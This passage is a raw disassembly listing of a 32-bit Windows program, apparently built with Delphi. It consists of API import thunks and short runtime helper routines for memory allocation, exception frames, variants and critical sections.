jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_4060e8
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualProtectEx
jmp [ __import_lookup_table_6(kernel32:VirtualProtectEx) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
WinExec
jmp [ __import_lookup_table_6(kernel32:WinExec) ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ __import_lookup_table_8(gdi32:CreateBrushIndirect) ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetClipRgn
jmp [ __import_lookup_table_8(gdi32:GetClipRgn) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
ScaleWindowExtEx
jmp [ __import_lookup_table_8(gdi32:ScaleWindowExtEx) ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ __import_lookup_table_8(gdi32:UnrealizeObject) ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
BringWindowToTop
jmp [ __import_lookup_table_9(user32:BringWindowToTop) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
InvalidateRect
jmp [ InvalidateRect@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollPos
jmp [ __import_lookup_table_9(user32:SetScrollPos) ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_40683c
shr eax 0x10
retn
sub_406840
movzx eax ax
shr eax 0x8
retn
sub_406848
call GetTickCount
retn
sub_406850
xor eax eax
retn
sub_406854
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406864
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406880
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406894
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_4068cc
call sub_406830
retn
sub_4068d4
call sub_406830
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406ab1
jmp sub_403994
sub_406ab8
pop ebp
retn
sub_406abc
sub [ rw-data ] 0x1
retn
sub_406ae9
jmp sub_403994
sub_406af0
pop ebp
retn
sub_406af4
sub [ rw-data ] 0x1
retn
sub_406df9
jmp sub_403994
sub_406e00
pop ebp
retn
sub_406e04
sub [ rw-data ] 0x1
retn
sub_4078c1
add eax 0xffffffd4
jmp sub_40cafc
sub_4078c9
add eax 0xffffffd4
jmp sub_40c9a4
sub_4078d1
add eax 0xffffffd4
jmp sub_40ca40
sub_4078e3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4056a0
sub_4078ed
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4056b4
sub_407c1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407be4
test eax eax
sete al
pop esi
pop ebx
retn
sub_408134
call sub_408110
retn
sub_4081cc
push eax
call CloseHandle
retn
sub_408354
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408368
push esi
mov esi eax
xchg edx eax
call sub_4028b8
mov eax esi
pop esi
retn
sub_408528
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026bc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_40853c
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408574
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026dc
sub_4085dc
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402818
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408600
push ebx
mov ebx eax
mov eax ebx
call sub_403f90
pop ebx
retn
sub_408963
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403f90
pop eax
pop ebx
retn
sub_408c1b
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408d76
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4090d3
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4090d3
sub_409190
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404450
mov edx esi
xor ecx ecx
call sub_40901c
pop esi
pop ebx
retn
sub_409204
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404450
mov edx esi
mov cl 0x1
call sub_40901c
pop esi
pop ebx
retn
sub_40987e
jmp sub_403994
sub_409885
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409976
jmp sub_403994
sub_40997d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a121
jmp sub_403994
sub_40a128
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a1b0
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a154
pop ebp
retn 0x8
sub_40a2f5
jmp sub_403994
sub_40a2fc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a79f
jmp sub_403994
sub_40a7a6
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ac8b
jmp sub_403994
sub_40ac92
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ad3d
jmp sub_403994
sub_40ad44
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40ade7
jmp sub_403994
sub_40adee
pop esi
pop ecx
pop ebp
retn
sub_40afca
jmp sub_403994
sub_40afd1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b028
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b31a
jmp sub_403994
sub_40b3e8
jmp sub_403994
sub_40b410
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_40320c
sub_40b50c
pop ebx
retn
sub_40b5ac
jmp sub_403994
sub_40b5b3
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b5bc
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4039cc
sub_40b5c9
retn
sub_40b5cc
push ebp
mov ebp esp
call sub_40b510
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b5bc
pop ebp
retn 0x4
sub_40b5e8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
retn
sub_40b680
push ebx
mov ebx eax
mov eax ebx
call sub_40b600
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40b853
jmp sub_403994
sub_40b85a
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b91f
jmp sub_403994
sub_40b926
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40b930
call sub_40b1bc
mov eax 0x1
call sub_403f78
sub_40bab4
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bb8d
jmp sub_403994
sub_40bbaa
jmp sub_403994
sub_40bbb1
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40bc5c
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bbc0
mov ecx eax
sub_40be48
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40be68
push eax
call CharNextA
retn
sub_40c08c
jmp sub_403994
sub_40c093
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c0fc
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c553
jmp sub_403994
sub_40c55a
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ Sleep@IAT ]
sub_40c698
jmp sub_403994
sub_40c69f
pop ebx
mov esp ebp
pop ebp
retn
sub_40c6a4
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40c608
sub_40c6b4
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40c6d0
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026dc
pop ebx
retn
sub_40c758
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40c764
xchg [ eax ] edx
mov eax edx
retn
sub_40c7c4
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40c854
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40c96c
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40c994
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40cc0f
jmp sub_403994
sub_40cc16
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40cc84
jmp sub_403994
sub_40cc8b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cca9
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40cca2
jmp sub_403994
sub_40cca9
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d0f9
jmp sub_403994
sub_40d100
pop ebp
retn
sub_40d16c
jmp sub_403994
sub_40d173
pop ebp
retn
VariantInit
jmp [ VariantInit@IAT ]
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40d1ec
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d252
jmp sub_403994
sub_40d259
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d2be
jmp sub_403994
sub_40d2c5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d32a
jmp sub_403994
sub_40d331
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d396
jmp sub_403994
sub_40d39d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d402
jmp sub_403994
sub_40d409
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d481
jmp sub_403994
sub_40d488
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d4f4
jmp sub_403994
sub_40d4fb
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d564
jmp sub_403994
sub_40d56b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d5d8
jmp sub_403994
sub_40d5df
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40d965
jmp sub_403994
sub_40d96c
pop ebp
retn
sub_40d970
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40d634
sub_40d981
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40dfa2
jmp sub_403994
sub_40dfa9
pop ecx
pop ebp
retn
sub_40e03b
jmp sub_403994
sub_40e042
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e092
jmp sub_403994
sub_40e099
pop ecx
pop ebp
retn
sub_40e12b
jmp sub_403994
sub_40e132
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e182
jmp sub_403994
sub_40e189
pop ecx
pop ebp
retn
sub_40e3d1
jmp sub_403994
sub_40e3d8
pop ebx
mov esp ebp
pop ebp
retn
sub_40e46a
jmp sub_403994
sub_40e471
pop ecx
pop ebp
retn
sub_40e474
push ebx
mov ebx eax
mov eax ebx
call sub_40e70c
mov [ ebx ] 0x1
pop ebx
retn
sub_40e70c
test [ eax ] 0xbfe8
jne r-xdata
call sub_40e690
retn
mov [ eax ] 0x0
retn
sub_40e720
push eax
call sub_40e70c
pop eax
retn
sub_40e980
call sub_40ea34
retn
sub_40eb9e
jmp sub_403994
sub_40eba5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ec49
jmp sub_403994
sub_40ec50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec72
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404688
retn
sub_40ec6b
jmp sub_403994
sub_40ec72
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ecce
jmp sub_403994
sub_40ecd5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ed51
jmp sub_403994
sub_40f297
jmp sub_403994
sub_40f29e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f331
jmp sub_403994
sub_40f338
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f355
lea eax [ ebp - 0x14 ]
call sub_404670
retn
sub_40f34e
jmp sub_403994
sub_40f355
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f3b2
jmp sub_403994
sub_40f3b9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f45b
jmp sub_403994
sub_40f478
jmp sub_403994
sub_40f47f
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f9da
jmp sub_403994
sub_40f9e1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fa8c
push eax
call sub_40e70c
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_40faa0
push eax
call sub_40e70c
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_40fb18
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40ea34
add esp 0x10
sub_40fdc2
jmp sub_403994
sub_40fdc9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fe0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40e70c
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40fe24
mov edx 0x80020004
call sub_40fe0c
retn
sub_40fe44
[ edx + ebx * 8 + 0x40 ]
sub_40feb5
jmp sub_403994
sub_40febc
pop esi
pop ebx
pop ebp
retn
sub_40fec0
push ebp
mov ebp esp
call sub_410080
pop ebp
retn 0x4
sub_40ff4c
push ebp
mov ebp esp
call sub_410080
pop ebp
retn 0x4
sub_41002f
jmp sub_403994
sub_410036
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403248
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035b4
sub_410058
xor eax eax
retn
sub_41005c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410070
mov [ ecx ] 0x8
mov al 0x1
retn
sub_410078
call sub_40df58
retn
sub_410080
call sub_40e048
retn
sub_410088
call sub_40e420
retn
sub_410090
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4100a4
call sub_410080
retn
sub_4100ac
push ebp
mov ebp esp
call sub_410088
pop ebp
retn 0x8
sub_4100c4
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4101a0
jmp sub_403994
sub_410269
jmp sub_403994
sub_410270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41028d
lea eax [ ebp - 0x10 ]
call sub_403f90
retn
sub_410286
jmp sub_403994
sub_41028d
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410298
call sub_40e474
retn
sub_41030f
jmp sub_403994
sub_410316
pop ebp
retn
sub_4103b9
jmp sub_403994
sub_4103c0
pop ebp
retn
sub_4104d1
jmp sub_403994
sub_4104d8
pop ebp
retn
sub_4104dc
sub [ rw-data ] 0x1
retn
sub_410510
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_410794
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403fe4
pop esi
pop ebx
retn
sub_410830
jmp sub_403994
sub_410837
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_410932
jmp sub_403994
sub_410939
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410b38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40ea34
pop esi
pop ebx
retn
sub_410cba
jmp sub_403994
sub_410cc1
pop ebp
retn
sub_410cc4
sub [ rw-data ] 0x1
retn
sub_410cf1
jmp sub_403994
sub_410cf8
pop ebp
retn
sub_410cfc
sub [ rw-data ] 0x1
retn
sub_4115ff
add [ esp + 0x4 ] 0xfffffff8
jmp sub_413f44
sub_411609
add [ esp + 0x4 ] 0xfffffff8
jmp sub_413f64
sub_411fe7
add [ esp + 0x4 ] 0xffffffd8
jmp sub_419930
sub_411ff1
add [ esp + 0x4 ] 0xffffffd8
jmp sub_419950
sub_411ffb
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_412368
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_41248c
mov eax [ eax + 0xc ]
call sub_413650
retn
sub_412763
jmp sub_403994
sub_41276a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412770
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413808
test eax eax
setge al
pop esi
pop ebx
retn
sub_412a73
jmp sub_403994
sub_412a7a
mov esp ebp
pop ebp
retn
sub_412b48
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_412b54
push ebx
mov ebx edx
mov edx ebx
call sub_412968
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_4126c8
sub_412c00
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_412d5b
jmp sub_403994
sub_412e2f
jmp sub_403994
sub_412e40
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_412eac
jmp sub_403994
sub_412eb3
pop ebx
mov esp ebp
pop ebp
retn
sub_412efe
jmp sub_403994
sub_412f05
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_412f91
